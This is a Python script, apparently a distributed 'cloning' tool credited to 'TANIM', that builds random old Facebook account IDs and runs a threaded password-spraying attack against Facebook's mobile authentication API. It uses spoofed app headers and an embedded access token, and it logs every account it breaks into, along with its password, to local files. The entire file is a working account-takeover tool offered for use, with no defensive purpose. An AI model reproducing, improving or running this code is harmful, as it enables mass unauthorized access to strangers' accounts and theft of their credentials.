W = '\033[97;1m'
R = '\033[91;1m'
G = '\033[92;1m'
Y = '\033[93;1m'
B = '\033[94;1m'
P = '\033[95;1m'
C = '\033[96;1m'
N = '\x1b[0m'
import os
try:
	import requests
except ImportError:
	os.system("pip install requests")

try:
	import concurrent.futures
except ImportError:
	os.system("pip install futures")
import urllib
import os
import sys
import time
import requests
import random
import platform
import base64
import subprocess
from concurrent.futures import ThreadPoolExecutor
import requests,bs4,uuid,json,os,sys,random,datetime,time,re,subprocess
try:
	import rich
except ImportError:
	os.system('pip install rich')
	time.sleep(1)
	try:
		import rich
	except ImportError:
		exit(' [×] Cant Install Rich Module, Try Manual Install (pip install rich)')
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
import base64
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from urllib.parse import quote
os.system("xdg-open https://www.facebook.com/abu.tanim.902")
try:
  os.system("mkdir SAVE")
except:
  pass
okc="ok.txt"
cpc="cp.txt"
logo = ("""\033[1;32m


 

                       ╔════╦═══╦═══╦═╗╔═╗
                       ║╔╗╔╗║╔══╣╔═╗║║╚╝║║
                       ╚╝║║╚╣╚══╣║─║║╔╗╔╗║
                       ──║║─║╔══╣╚═╝║║║║║║
                       ──║║─║╚══╣╔═╗║║║║║║
                       ──╚╝─╚═══╩╝─╚╩╝╚╝╚╝
             ╔═══╦═══╦═══╦╗──╔╦═══╦══╦═══╦╗─╔╦════╗
             ║╔═╗║╔═╗║╔═╗║╚╗╔╝║╔═╗╠╣╠╣╔═╗║║─║║╔╗╔╗║
             ║║─╚╣║─║║╚═╝╠╗╚╝╔╣╚═╝║║║║║─╚╣╚═╝╠╝║║╚╝
             ║║─╔╣║─║║╔══╝╚╗╔╝║╔╗╔╝║║║║╔═╣╔═╗║─║║
             ║╚═╝║╚═╝║║────║║─║║║╚╦╣╠╣╚╩═║║─║║─║║
             ╚═══╩═══╩╝────╚╝─╚╝╚═╩══╩═══╩╝─╚╝─╚╝
                                                             V:2.0
 \033                            
 
                 🔥 PAID TOOLS BYPASS BY TANIM 🔥
              _______________________________________
                                
                         Github   :  TANIM                      
  
                         whatsapp  : 01572218151

                         Facebook : Abu Tanim
  
                  Description : IT'S A BYPASS TOOLS
  
                 🔥 TOOLS QUALITY NOT BAD.TRY IT 🔥
  
                     🔥🔥 BYPASS BY TANIM 🔥🔥
             ________________________________________\033[1;32m""")
class Main:
	def __init__(self):
		self.id = []
		self.ok = []
		self.cp = []
		self.loop = 0
		os.system("clear")
		print(logo)
		print(" [1] 2009-10 Cloning")
		print("\n")
		BYPASS =input(" Choose : ")
		if BYPASS in ["1", "01"]:
			self.old()
		else:
			print (" Select Correctly ")
			time.sleep(1)
			Main()
	def old(self):
		x = 111111111
		xx = 999999999
		idx = "100000" 
		os.system('clear');print(logo)
		limit = int(input(" \n\033[0;95m[+]\033[0;93m TOTAL IDS TO CRACK LIMIT 9999999999 : "))
		
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
			#print(self.id)
			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n\033[1;32m [!] USE (123456) FOR IDZ\033[1;37m ")
				listpass = input("%s [?] ENTER PASSWORD :%s "%(G,Y))
				if len(listpass)<=5:
					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(B))
				print("%s [*] CRACK WITH PASSWORD -> [\033[1;32m%s\033[0;93m]"%(G,listpass))
				os.system("clear")
				print(logo)
				print(f"\n%s [+] OK RESULTS SAVED IN -> {okc}"%(Y))
				print(f"%s [+] CP RESULTS SAVED IN -> {cpc}"%(G))
				print("%s [!] IF NO RESULT USE AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(P))
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n [>>] Okay Dear Your Crack is complte...")
		except Exception as e:exit(str(e))

	def api(self, uid, pwx):
		rua = random.choice([
			"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]",
			  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E)"])
		sys.stdout.write("\r [ TANIM ] %s/%s -> Cp:-%s - Ok:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok)))
		sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			ses = requests.Session()
			headers = {
				"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
				"x-fb-sim-hni": str(random.randint(20000, 40000)), 
				"x-fb-net-hni": str(random.randint(20000, 40000)), #don't_change_creadit_its_Tan_Vai
				"x-fb-connection-qunisadty": "EXCELLENT",
				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
				"user-agent": rua, 
				"content-type": "application/x-www-form-urlencoded", 
				"x-fb-http-engine": "Liger"
			}
			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers)
			#print(response.text)
			#sys.exit()
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[1;31m[ T-C ] %s | %s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open(okc,"a").write(" %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[1;31m[ T-C ] %s | %s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open(okc,"a").write(" %s | %s\n"%(uid, pw))
				break
			else:
				#print("\r \033[1;32m[ BYPASS-CHECK ] %s | %s\033[0;97m         "%(uid, pw))
				continue

		self.loop +=1
Main()
